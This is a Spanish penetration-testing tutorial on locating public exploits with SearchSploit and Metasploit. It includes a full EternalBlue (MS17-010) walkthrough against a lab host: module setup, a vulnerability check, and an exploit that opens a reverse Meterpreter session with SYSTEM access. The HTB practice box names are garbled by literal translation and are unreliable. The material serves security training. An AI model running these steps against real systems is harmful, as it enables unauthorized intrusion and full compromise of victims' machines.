# Explotaciones públicas

**Resumen breve:**
Identificados los servicios (p. ej., SSH (Secure Shell), FTP (File Transfer Protocol), SMB (Server Message Block)) tras el escaneo con Nmap, el primer paso es comprobar **si existen exploits públicos** aplicables a sus versiones. Para ello, combinamos **búsquedas en Google**, **SearchSploit (Exploit-DB)**, bases de datos en línea y, cuando proceda, **Metasploit Framework (MSF)** para verificación y explotación.

---

## Puntos clave (destacados)

* **Prioriza la identificación precisa de versión** del servicio/APP antes de buscar un exploit.
* **Fuentes habituales:** Google, SearchSploit (Exploit-DB), bases de datos de Rapid7 (Metasploit) y otras colecciones públicas.
* **MSF (Metasploit Framework)**: permite buscar, verificar (`check`) y explotar, además de facilitar post-explotación con Meterpreter.
* **Ética/alcance:** solo explotes dentro del alcance autorizado, registra acciones y limpia artefactos.

---

## Encontrar exploits públicos

### Búsqueda en Google

Realiza búsquedas combinando **nombre del servicio + versión + “exploit”** o **CVE (Common Vulnerabilities and Exposures)** relevante.

```
https://www.google.com/
```

> Ejemplo (ilustrativo): resultados para “Exploit para SMB (Server Message Block) de Windows 7” suelen incluir referencias a **EternalBlue (MS17-010)**.

### SearchSploit (Exploit-DB)

Instalación:

```bash
sudo apt install exploitdb -y
```

Búsqueda por nombre/versión:

```bash
searchsploit openssh 7.2
```

Salida de ejemplo (recortada):

```
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                               | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                              | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                      | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                                                         | linux/remote/40136.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privilege Escalation                         | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                                                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                                                         | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                                        | linux/remote/40113.txt
----------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

> Tip: también puedes usar **`searchsploit -w`** (enlaces web), **`-x`** (ver archivo), **`-m`** (copiar localmente) y **`--id`** (por EDB-ID (Exploit Database ID)).

### Otras bases de datos en línea

* Exploit Database (Exploit-DB) / Rapid7 (módulos MSF)
* Otras colecciones públicas / boletines del fabricante

---

## Introducción a Metasploit (MSF)

**Metasploit Framework (MSF)** ofrece:

* Scripts de **reconocimiento** para enumerar hosts/servicios.
* **Verificación** de vulnerabilidades con `check` (cuando el módulo lo soporte).
* **Meterpreter** para obtener sesión y ejecutar comandos en el host comprometido.
* Herramientas de **post-explotación** y **pivoting**.

### Flujo básico con MSF (ejemplo: MS17-010 / EternalBlue)

Iniciar consola:

```bash
msfconsole
```

Buscar el exploit:

```text
msf6 > search exploit eternalblue
```

Salida (resumen):

```
Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   ...
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010
```

Usar el módulo:

```text
msf6 > use exploit/windows/smb/ms17_010_psexec
```

Ver opciones del módulo:

```text
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```

Opciones relevantes (extracto):

```
Name        Current Setting  Required  Description
----        ---------------  --------  -----------
RHOSTS                       yes       The target host(s)
RPORT       445              yes       The Target port (TCP (Transmission Control Protocol))
SMBUser                      no        The username to authenticate as
SMBPass                      no        The password for the specified username
SHARE       ADMIN$           yes       Share to connect to
```

Configurar objetivo (RHOSTS) y atacante (LHOST):

```text
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0
```

Comprobar si es vulnerable:

```text
msf6 exploit(windows/smb/ms17_010_psexec) > check
```

Salida típica:

```
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445 - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
```

Ejecutar la explotación:

```text
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
```

Resultado esperado (resumen):

```
[*] Started reverse TCP (Transmission Control Protocol) handler on 10.10.14.2:4444
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.40:49159)
```

Post-explotación con Meterpreter (y shell del sistema):

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
C:\\WINDOWS\\system32> whoami
NT AUTHORITY\SYSTEM
```

> Nota: No todos los módulos soportan `check`. Si falla, intenta verificación manual o módulos auxiliares.

---

## Cajas de práctica recomendadas (HTB)

* Abuela / Abuelo
* Jerry
* Azul
* Cojo
* Óptimo
* Legado
* Desarrollo

---

## Buenas prácticas

* Respeta el **alcance** y la **autorización**.
* Documenta cada paso (comandos, parámetros, evidencias).
* Aplica **defensa en profundidad**: si un exploit falla, prueba versiones alternativas, vectores manuales o combinación con credenciales.
* **Limpieza**: elimina artefactos y revierte cambios menores al finalizar.

---

## Referencias rápidas

* **CVE (Common Vulnerabilities and Exposures)**: estándar para identificar vulnerabilidades.
* **EDB-ID (Exploit Database ID)**: identificador de Exploit-DB para localizar PoC (Proof of Concept) específicos.

---

*Fin del documento.*
